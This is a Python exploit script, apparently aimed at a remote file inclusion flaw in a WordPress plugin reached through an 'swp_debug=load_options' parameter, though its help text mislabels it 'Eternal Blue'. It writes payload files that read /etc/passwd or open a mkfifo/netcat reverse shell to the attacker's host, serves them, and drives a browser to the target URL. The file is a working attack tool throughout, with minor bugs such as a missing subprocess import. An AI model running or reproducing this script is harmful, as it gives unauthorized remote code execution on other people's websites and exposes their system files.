#!/usr/bin/python3

import os
import argparse
import sys
import time
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import importlib.util

#install libaries if not installed
print("Installing necessary tools if not already installed")
package_name = 'colorama'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
package_name = 'selenium'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
                                                                                                                                                                                                                            
parser = argparse.ArgumentParser(description="Eternal Blue",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="Eternal Blue", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-u", "--URL", action="store", help="URL")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
parser.add_argument("-lp", "--LPORTU", action="store", help="Python Server port on local host (ex 8080)")
parser.add_argument("-T", "--TEST", action="store_true", help="Test if vulnerable")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

LPORT = args.LPORT
LPORTU = args.LPORTU
LHOST = args.LHOST
URL = args.URL
TEST=args.TEST

if TEST is True:
	if LHOST is None:
		print(f"Need LHOST, use -h for help")
	if LPORTU is None:
		print(f"Need Web Port, use -h for help")
	with open ("pass.txt", "w") as f:
		f.write(f"<pre>system('cat /etc/passwd')</pre>")
		ext = f"/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{LHOST}:{LPORTU}/pass.txt"
		input(f"{YELLOW}Start web server on port {LPORTU}, press enter when ready{RESET}")
		print(f"{MAGENTA}Attacking {URL}{ext}{RESET}")
		input(f"{RED}When web page opens press F5 to refresh, should see /etc/passwd if vulnerable, press enter to continue{RESET}")
		time.sleep(3)
		driver = webdriver.Firefox()
		URL1 = f"{URL}{ext}"
		driver.get(URL1)

if TEST is False:
	print(f"{YELLOW}Creating rev.txt{RESET}")
	input(f"{RED}Start nc -lvnp {LPORT} and python3 -m http.server {LPORTU}, press enter to continue{RESET}")
	input(f"{YELLOW}When webpage opens click address bar and press enter, please press enter to continue{RESET}")
	with open ("rev.txt", "w") as f:
		f.write(f"<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f')</pre>")
	driver = webdriver.Firefox()
	ext = f"/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{LHOST}:{LPORTU}/rev.txt"
	URL1 = f"http://{URL}{ext}"
	driver.get(URL1)

